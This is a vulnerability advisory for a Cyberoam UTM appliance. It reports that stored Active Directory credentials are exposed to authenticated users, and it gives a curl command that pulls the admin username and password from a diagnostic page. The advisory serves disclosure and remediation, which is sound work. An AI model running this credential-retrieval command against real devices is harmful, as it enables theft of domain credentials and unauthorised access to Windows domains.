SECURITY ADVISORY:  cyberoam-utm-insecure-password-handling

Affected Software:   Cyberoam CR50ia 10.01.0 build 678
Vulnerability:       Insecure Password Handling
Severity:            High
Release Date:        Unreleased
	

I. Background
~~~~~~~~~~~~~	   	

"Cyberoam Unified Threat Management appliances offer assured security,
connectivity and productivity to Small Office-Home Office (SOHO) and
Remote Office-Branch Office (ROBO) users by allowing user
identity-based policy controls."

Cyberoam UTM integrates with Active Directory. In order to query data
from a configured AD, domain credentials are stored within the device.
These credentials are retrievable by an authenticated user.


II. Description
~~~~~~~~~~~~~~~

Domain credentials are stored on the device and passed to web
clientson a diagnostic page (Identity --> Authentication -->
Authentication Server --> /Select Configured AD/ ).  Authenticated
clients can thus easily access stored credentials.

A trivial check for this follows (replace cookie value):

curl -s -b "JSESSIONID=u2ur76lhy4qt" -H "Referer: blah"
"http://<webserver>/corporate/webpages/identity/ActiveDirectoryEdit.jsp?__RequestType=ajax&&objectID=1&pageid=pagePopupForm1"|egrep
'(adminusername|passwdvalue)'


III. Impact
~~~~~~~~~~~

The vulnerability allows a malicious user to access potentially
privileged domain credentials. Should default passwords not be
changed, then this is a trivial entry point onto a Windows domain.


IV. Remediation
~~~~~~~~~~~~~~~

Do not return stored credentials to the browser.
